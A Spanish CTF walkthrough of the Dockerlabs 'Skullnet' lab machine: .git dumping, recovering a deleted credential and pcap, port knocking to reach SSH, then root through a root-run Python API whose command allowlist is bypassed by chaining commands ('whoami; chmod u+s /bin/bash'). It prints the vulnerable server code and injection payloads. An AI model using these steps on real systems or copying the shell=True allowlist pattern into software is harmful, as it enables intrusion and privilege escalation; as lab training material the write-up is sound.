---
icon: flag
---

# Skullnet Dockerlabs (Difícil)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip skullnet.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh skullnet.tar
```

Info:

```
                           ##        .         
	             ## ## ##       ==         
	          ## ## ## ##      ===         
	      /""""""""""""""""\___/ ===       
	 ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	      \______ o          __/           
	        \    \        __/            
	         \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				    

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.25.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 12:43 EDT
Nmap scan report for skullnet.es (172.25.0.2)
Host is up (0.000087s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SkullNet
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-git: 
|   172.25.0.2:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Fix 
MAC Address: 02:42:AC:19:00:02 (Unknown)
Service Info: Host: 172.25.0.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.43 seconds
```

Si nos vamos a la URL para ver la pagina web, veremos que esta bajo un dominio llamado `skullnet.es` por lo que nos lo pondremos en nuestro archivo `hosts` para que nos lo resuelva.

```shell
nano /etc/hosts

#Dentro del nano
<IP>     skullnet.es
```

Lo guardamos y si recargamos la pagina, ahora si la veremos bien, pero poco hay en la pagina, por lo que fuzzearemos un poco.

### Dirsearch

```shell
dirsearch -u http://skullnet.es/
```

Info:

```
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/dise0/Desktop/skullnet/reports/http_skullnet.es/__24-08-11_12-54-09.txt

Target: http://skullnet.es/

[12:54:09] Starting: 
[12:54:10] 200 -  408B  - /.git/branches/
[12:54:10] 200 -  608B  - /.git/
[12:54:10] 200 -    4B  - /.git/COMMIT_EDITMSG
[12:54:10] 200 -   92B  - /.git/config
[12:54:10] 200 -   73B  - /.git/description
[12:54:10] 200 -   23B  - /.git/HEAD
[12:54:10] 301 -  309B  - /.git  ->  http://skullnet.es/.git/
[12:54:10] 200 -  690B  - /.git/hooks/
[12:54:10] 200 -  305B  - /.git/index
[12:54:10] 200 -  456B  - /.git/info/
[12:54:10] 200 -  240B  - /.git/info/exclude
[12:54:10] 200 -  479B  - /.git/logs/
[12:54:10] 301 -  319B  - /.git/logs/refs  ->  http://skullnet.es/.git/logs/refs/
[12:54:10] 200 -  293B  - /.git/logs/refs/heads/master
[12:54:10] 301 -  325B  - /.git/logs/refs/heads  ->  http://skullnet.es/.git/logs/refs/heads/
[12:54:10] 200 -  293B  - /.git/logs/HEAD
[12:54:10] 200 -  537B  - /.git/objects/
[12:54:10] 200 -  464B  - /.git/refs/
[12:54:10] 200 -   41B  - /.git/refs/heads/master
[12:54:10] 301 -  319B  - /.git/refs/tags  ->  http://skullnet.es/.git/refs/tags/
[12:54:10] 301 -  320B  - /.git/refs/heads  ->  http://skullnet.es/.git/refs/heads/
[12:54:10] 403 -  276B  - /.ht_wsr.txt
[12:54:10] 403 -  276B  - /.htaccess.bak1
[12:54:10] 403 -  276B  - /.htaccess.orig
[12:54:10] 403 -  276B  - /.htaccess.sample
[12:54:10] 403 -  276B  - /.htaccess_extra
[12:54:10] 403 -  276B  - /.htaccess.save
[12:54:10] 403 -  276B  - /.htaccessBAK
[12:54:10] 403 -  276B  - /.htaccessOLD2
[12:54:10] 403 -  276B  - /.htm
[12:54:10] 403 -  276B  - /.html
[12:54:10] 403 -  276B  - /.htaccess_orig
[12:54:10] 403 -  276B  - /.htaccess_sc
[12:54:10] 403 -  276B  - /.htaccessOLD
[12:54:10] 403 -  276B  - /.htpasswd_test
[12:54:10] 403 -  276B  - /.httr-oauth
[12:54:10] 403 -  276B  - /.htpasswds
[12:54:40] 403 -  276B  - /server-status
[12:54:40] 403 -  276B  - /server-status/

Task Completed
```

### Herramienta Git

No pasaremos el git mediante una herramienta.

```shell
git clone https://github.com/internetwache/GitTools.git
```

Una vez clonado, nos vamos a la siguiente ubicacion.

```shell
cd GitTools/Dumper/
```

```shell
bash gitdumper.sh http://skullnet.es/.git/ git_skullnet
```

Hecho esto clonaremos todo el repositorio de la web, en la carpeta actual llamada `git_skullnet`.

Si investigamos en la misma vemos un `HEAD` con un hash, por lo que volcaremos esa informacion con la siguiente herramienta.

```shell
git show 9c902d081106a85cf2d928cd96a1cd9c90d7a2c9
```

Info:

```
commit 9c902d081106a85cf2d928cd96a1cd9c90d7a2c9 (HEAD -> master)
Author: admin <admin@skullnet.es>
Date:   Thu Jun 20 18:08:35 2024 +0200

    Fix

diff --git a/authentication.txt b/authentication.txt
deleted file mode 100644
index caf37fb..0000000
--- a/authentication.txt
+++ /dev/null
@@ -1,5 +0,0 @@
-Hello skulloperator, as you know, we are implementing a new authentication mechanism to avoid brute-forcing...
-
-This credential and the attached network file will be enough. I know you will get it ;)
-
-+%7nj^g!DQxp]a>c4v&0
diff --git a/network.pcap b/network.pcap
deleted file mode 100644
index 7619fb9..0000000
Binary files a/network.pcap and /dev/null differ
```

Nos da bastante informacion de varias cosas, por lo que vemos hay un archivo llamado `authentication.txt` que fue eliminado, por lo que lo recuperaremos.

```shell
git log --all -- authentication.txt
```

Info:

```
commit 9c902d081106a85cf2d928cd96a1cd9c90d7a2c9 (HEAD -> master)
Author: admin <admin@skullnet.es>
Date:   Thu Jun 20 18:08:35 2024 +0200

    Fix

commit 648d951e0f8b7cc60b11c82d9328fe9cb1a4a53d
Author: admin <admin@skullnet.es>
Date:   Thu Jun 20 18:07:45 2024 +0200

    First commit
```

Ahora veremos el primero commit que se hizo con ese hash.

```shell
git show 648d951e0f8b7cc60b11c82d9328fe9cb1a4a53d:authentication.txt
```

Info:

```
Hello skulloperator, as you know, we are implementing a new authentication mechanism to avoid brute-forcing...

This credential and the attached network file will be enough. I know you will get it ;)

+%7nj^g!DQxp]a>c4v&0
```

Y ahi veremos las verdaderas credenciales.

```
User = skulloperator
Pass = +%7nj^g!DQxp]a>c4v&0
```

Y ahora recuperaremos el `.pcap` que nos mostro antes, de la siguiente forma.

```shell
git show 648d951e0f8b7cc60b11c82d9328fe9cb1a4a53d:network.pcap > network.pcap
```

Esto nos creara el `.pcap` con la informacion por lo que lo habriremos con `wireshark`.

```shell
wireshark network.pcap
```

Y dentro del entorno grafico de `wireshark` veremos que la IP del cliente se esta conectando por ssh haciendo un `portnocking` de 3 puertos en concreto `1000, 12000 y 5000` ya que estamos viendo que la misma IP tocar 3 puertos por lo que deducimos que hay que hacer la tecnica dicha anteriormente, por lo que utilizaremos la herramienta `knockd` para tocar ese puerto y que se habra el ssh.

### Knockd

```shell
knock <IP> 1000 12000 5000
```

Si hacemos eso, veremos que se nos habra abierto puerto del SSH, lo miraremos haciendo lo siguiente.

```shell
nmap -sCV -p22 <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-12 07:17 EDT
Nmap scan report for skullnet.es (172.26.0.2)
Host is up (0.00012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:e6:9f:04:3f:d8:d9:f4:f3:3c:19:67:64:d2:d5:b1 (ECDSA)
|_  256 42:61:9e:37:3d:51:bf:d3:31:8d:ed:4f:96:4b:3d:4a (ED25519)
MAC Address: 02:42:AC:1A:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.37 seconds
```

Por lo que ahora nos conectaremos con las credenciales que obtuvimos anteriormente.

### SSH

```shell
ssh skulloperator@<IP>
```

Y metemos la contraseña `+%7nj^g!DQxp]a>c4v&0` que obtuvimso anteriormente, por lo que ya estariamos dentro de la maquina.

> user.txt (flag1)

```
Congratulations operator, but this is not the end.

You still have work to do, will talk later...

flag{
      #############
    ##            *##
   #               **#
  #       %% %%    ***#
 #       %%%%%%%   ****#
#         %%%%%    *****#
#   ###     %     ###***#
#  # ####       #### #**#
#  #     #     #     #**#
#   #####  # #  #####***#
#         #   #  *******#
 ### #           **# ###
     # - - - - - - #
      | | | | | | |        }
```

### Privilege Escalation

Si nos vamos a la siguiente ubicacion `/var/www/skullnet.es/` veremos un archivo llamado `skullnet_api.py` y si lo leemos, veremos lo siguiente.

```python
import http.server
import socketserver
import urllib.parse
import subprocess
import base64
import os

PORT = 8081

AUTH_KEY_BASE64 = "d2VfYXJlX2JvbmVzXzUxMzU0NjUxNjQ4NjQ4NA=="

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        
        auth_header = self.headers.get('Authorization')

        if auth_header is None or not auth_header.startswith('Basic' ):
            self.send_response(401)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Authorization header is missing or incorrect")
            return
        
        clear_text_key = auth_header.split('Basic ')[1]
        
        decoded_key = base64.b64decode(AUTH_KEY_BASE64).decode()
        
        if clear_text_key != decoded_key:
            self.send_response(403)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Invalid authorization key")
            return

        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        if 'exec' in query_params:
            command = query_params['exec'][0]
            try:
                allowed_commands = ['ls', 'whoami']
                if not any(command.startswith(cmd) for cmd in allowed_commands):
                    self.send_response(403)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"Command not allowed.")
                    return

                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(result)
            except subprocess.CalledProcessError as e:
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(e.output)
        else:
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Missing 'exec' parameter in URL")

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    httpd.serve_forever()
```

Y luego viendo los procesos de los puertos que se estan corriendo.

```shell
netstat -punta
```

Info:

```
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:34191        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8081            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0    268 172.26.0.2:22           172.26.0.1:39610        ESTABLISHED -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.11:54592        0.0.0.0:*   
```

Por lo que podremos hacer lo siguiente.

Vemos que hay una `API Key` codificada en `Base64` y si la decodificamos sera lo siguiente.

```
we_are_bones_513546516486484
```

Por lo que ahora podremos autenticarnos de la siguiente forma, si queremos listar los archivos de la carpeta de `root` lo haremos de la siguiente forma ya que lo esta ejecutando `root`.

```shell
curl -H "Authorization: Basic we_are_bones_513546516486484" "http://127.0.0.1:8081/?exec=ls%20-la"
```

Info:

```
total 52
drwx------ 1 root root 4096 Jul 23 11:24 .
drwxr-xr-x 1 root root 4096 Aug 12 12:30 ..
-rw------- 1 root root   17 Jul 23 11:47 .bash_history
-rw-r--r-- 1 root root 3106 Apr 22 15:04 .bashrc
drwx------ 2 root root 4096 Jun 16 20:47 .cache
-rw-r--r-- 1 root root   48 Jun 20 17:53 .gitconfig
-rw------- 1 root root   20 Jun 20 18:09 .lesshst
drwxr-xr-x 3 root root 4096 Jun 16 19:10 .local
-rw-r--r-- 1 root root  161 Apr 22 15:04 .profile
-rw-r--r-- 1 root root    0 Jun 20 17:35 .selected_editor
drwx------ 2 root root 4096 Jun 16 19:08 .ssh
-rwxr-xr-x 1 root root   64 Jun 16 20:21 close.sh
-rwxr-xr-x 1 root root   66 Jun 16 20:21 open.sh
-rw-r--r-- 1 root root  587 Jul 23 11:23 root.txt
```

Como veremos funciona, por lo que cambiaremos los permisos de la `bash` para ser `root`, pero solo nos deja hacer `ls` o `whoami`, por lo que concatenaremos comandos para poder ejecutar lo que queramos.

```shell
curl -H "Authorization: Basic we_are_bones_513546516486484" "http://127.0.0.1:8081/?exec=whoami%3B%20cat%20%2Fetc%2Fpasswd"
```

Si primero hacemos ese `whoami` y despues leemos el `passwd` veremos que funciona, siempre codificandolo con URL Code.

Info:

```
root
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
skulloperator:x:1001:1001:skulloperator,,,:/home/skulloperator:/bin/bash
```

Ahora haremos lo de cambiar permisos en la `bash`.

```shell
curl -H "Authorization: Basic we_are_bones_513546516486484" "http://127.0.0.1:8081/?exec=whoami%3B%20chmod%20u%2Bs%20%2Fbin%2Fbash"
```

Y si vemos los permisos de la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31 10:41 /bin/bash
```

Veremos que funciono por lo que solo tendremos que hacer lo siguiente para ser `root`.

```shell
bash -p
```

Y ya seremos `root`, por lo que leeremos la flag.

```shell
cd /root/
cat root.txt
```

> root.txt (flag2)

```
I knew you would make it, congratulations operator.

It's time to move on to reality.

Join us: https://t.me/SkullNetOperators

flag{
          __________
       .~#########%%;~.
      /############%%;`\
     /######/~\/~\%%;,;,\
    |#######\    /;;;;.,.|
    |#########\/%;;;;;.,.|
    |##/~~\####%;;;/~~\;,|
    |#|  o  \##%;/  o  |.|
    |##\____/##%;\____/.,|
    \#########/\;;;;;;,,/
     \######/%;\;;;;, /
      |######%%;;;;,.|   
      |# # # % ; ; ;,|  }

We appreciate any feedback in our telegram community [ES/EN].

Ty so much!.

Created by @W4tson_Blue and @_Slayer0x.
```
